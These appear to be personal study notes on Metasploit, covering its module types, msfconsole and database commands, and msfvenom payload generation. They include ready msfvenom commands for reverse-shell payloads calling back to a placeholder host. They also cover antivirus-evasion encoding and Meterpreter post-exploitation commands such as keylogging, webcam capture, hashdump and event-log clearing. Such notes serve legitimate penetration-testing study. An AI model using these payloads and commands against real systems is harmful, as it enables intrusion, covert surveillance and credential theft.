Most widely used exploitation framework, metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation. 
`msfconsole`

# Modules
Metasploit has various modules that are small components within the Metasploit framework that are built to perform a specific task
## Auxiliary
Contains any supporting module, such as scanners, crawlers, fuzzers, etc.

## Encoders
This module allows us to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. These encoders have a limited success rate as antivirus solutions can perform additional checks

## Evasion
Evasion modules will try and evade the antivirus instead of trying to encode the exploit.

## Exploits
Contains the exploits :D

## NOPs
No OPerations do literally nothing, they are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as buffer to achieve consistent payload sizes

## Payloads
Metasploit offers the ability to send different payloads that can open shells on the target system:
* Adapters: Wraps single payloads to convert them into different formats. Ej. a normal payload can be wrapped inside a Powershell adapter which will make a single powershell command that will execute the payload.
* Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
* Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. "Staged payloads" will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
* Stages: Downloaded by the stager. This will allow us to use larger sized payloads.

## Post
Post modules are useful on the final stage of the penetration testing process, post-exploitation

# Commands
Functions similarly to the command shell in linux, having many similar commands like `ls`  as well as the following:

`use [PATH|INDEX]` selects a module to be used (ej. `exploit/windoes/smb/ms17_10_eternalblue`) we can also select the index of the module provided by the `search` command instead of the full path)
`show [OPTIONS]` lists available modules (auxiliary, payload, exploit, options, etc.)
`info` displays more information, can also be followed by a module path.
`search [type: MODULE] [platform: PLATFORM] KEYWORD` will search the database for modules relevant to the given search parameter, we can conduct searches using CVE numbers, exploit names or target systems. 
`set PARAMETER_NAME VALUE` used to set the different parameters of a module
`setg` functions the same as the `set` command, but this time sets the variable globally, changing it for all modules
`unset [PARAMETER|all]` gives the default value to one or all parameters
`unsetg` unset but globally
`exploit [-z]` runs the current module, `[-z]` runs it in the background
`run` same as the exploit command
`check` this will check if a target system is vulnerable without exploiting it, works on some modules
`sessions [-i n]` displays all existing sessions, `[-i n]` goes to the n session


# Exploitation
## Port Scanning
We can list potential port scanning modules by using `search portscan`. 
### UDP Dervice Identification
The `scanner/discovery/udp_sweep` module will allow us to quickly identify services running over the UDP. Even though it does not conducts an extensive scan of all possible UDP services it does provide a quick way to identify services such as DNS or NetBIOS.
### SMB Scans
We can also use Metasploit to scan the Server Message Block protocol, especially useful in a corporate network would be `smb_enumshares` and `smb_version` 

## Database
Metasploit has a database function to simply project management and avoid possible confusion when setting up parameter values. We need to start the PostgreSQL database which Metasploit will use with `systemctl start postgresql` (we need to run this outside msfconsole). Then we initialise the Metasploit database using `msfdb init`. Now we can launch `msfconsole` and check the database status using the `db_status` 

`workspace` lists available workspaces, 
	`[-a NAME]` add a workspace
	`[-d NAME]` delete a workspace
	`[NAME]` change to workspace
`db_nmap` will run [[Nmap]] and store the results in the database
`hosts` shows information relevant to hosts
	`[-R]` adds the hosts to the RHOSTS parameter
`services` shows information of the services
	`[-S SERVICE]` allows us to search for specific services in the environment

## Exploits
When making the use of an exploit we can always changed the preset default payload that is used by using `show payloads` in order to list other commands that we can use with that specific exploit, we can the set the payload with `set payload n` where n is the index of the payload showed earlier. Changing the payload may open new parameters that we need to set.


# Msfvenom
Msfvenom, which replaced Msfpayload and Msfencode, allows us to generate payloads. It will give us access to all payloads available in the Metasploit framework, it allows us to create payloads in many different formats and for different target systems.

`msfvenom`

|option|description|
|-|-|
|`--list formats`|lists supported output formats|
|`-l payloads`||
|`-p PAYLOAD`||
|`-e ENCODER`||
|`-f FORMAT`||

## Encoders
Encoders can be effective against some antivirus software, however, using obfuscation techniques or learning methods to inject shellcode can be a better solution to the problem. We can use the encoder in msfvenom with the `-e` parameter followed by the encoding method like `-e php/base64`, which would encode the PHP version of meterpreter in Base64  

## Handlers
Similar to exploits using a reverse shell, we need to accept incoming connections generated by the MSFvenom payload. With an exploit module, this part is automatically handled by the exploit module. Reverse shells or Meterpreter callbacks generated in our MSFvenom payload can be easily caught using a handler.

We can use the `use exploit/multi/handler` command  to receive the incoming connections, it supports all Metasploit payloads and can be used for Meterpreter as well as regular shells. To use it, we need to set the payload, LHOST and LPORT values.

## Other Payloads
Based on the target system's configuration, MSFvenom can be used to create payloads in almost all formats, some of the most used ones are
### elf
Linux Executable and Linkable Format (elf) is comparable to the **.exe** formatin windows. These are executable files for Linux. However, we still need to make sure we have executable permissions on the target machine, for this we can use `chmod +x shell.elf` to change the permissions of all users to allow them to execute that file.

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```

### Windows
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

### PHP
```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

### ASP
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

### Python
```sh
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

# Meterpreter
Is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. It runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target, aiming to avoid being detecte during antivirus scans. By default most antivirus software will scan new files on the disk, thus it runs in memory (RAM) to avoid having a file that has to be written to the disk. 
It also aims to avoid being detected by network-based IPS and IDS solutions by using encrypted communication with the server where Metasploit runs (our machine). If the target organisation does not decrypt and inspect encrypted traffic coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.
We can use `msfvenom --list payloads | grep meterpreter` to show the payloads that use meterpreter

## Commands
Some of the most commonly used commands.

Core Commands
- `background`: Backgrounds the current session
- `exit`: Terminate the Meterpreter session
- `guid`: Get the session GUID (Globally Unique Identifier)  
- `help`: Displays the help menu
- `info`: Displays information about a Post module
- `irb`: Opens an interactive Ruby shell on the current session
- `load`: Loads one or more Meterpreter extensions
- `migrate`: Allows you to migrate Meterpreter to another process
- `run`: Executes a Meterpreter script or Post module
- `sessions`: Quickly switch to another session

File system commands
- `cd`: Will change directory
- `ls`: Will list files in the current directory (dir will also work)
- `pwd`: Prints the current working directory
- `edit`: will allow you to edit a file
- `cat`: Will show the contents of a file to the screen
- `rm`: Will delete the specified file
- `search`: Will search for files
- `upload`: Will upload a file or directory
- `download`: Will download a file or directory

Networking commands
- `arp`: Displays the host ARP (Address Resolution Protocol) cache
- `ifconfig`: Displays network interfaces available on the target system  
- `netstat`: Displays the network connections
- `portfwd`: Forwards a local port to a remote service
- `route`: Allows you to view and modify the routing table

System commands
- `clearev`: Clears the event logs
- `execute`: Executes a command
- `getpid`: Shows the current process identifier
- `getuid`: Shows the user that Meterpreter is running as
- `kill`: Terminates a process
- `pkill`: Terminates processes by name
- `ps`: Lists running processes
- `reboot`: Reboots the remote computer
- `shell`: Drops into a system command shell
- `shutdown`: Shuts down the remote computer
- `sysinfo`: Gets information about the remote system, such as OS

Other commands
- `idletime`: Returns the number of seconds the remote user has been idle
- `keyscan_dump`: Dumps the keystroke buffer
- `keyscan_start`: Starts capturing keystrokes
- `keyscan_stop`: Stops capturing keystrokes
- `screenshare`: Allows you to watch the remote user's desktop in real time
- `screenshot`: Grabs a screenshot of the interactive desktop
- `record_mic`: Records audio from the default microphone for X seconds
- `webcam_chat`: Starts a video chat
- `webcam_list`: Lists webcams
- `webcam_snap`: Takes a snapshot from the specified webcam
- `webcam_stream`: Plays a video stream from the specified webcam
- `getsystem`: Attempts to elevate your privilege to that of local system
- `hashdump`: Dumps the contents of the SAM database

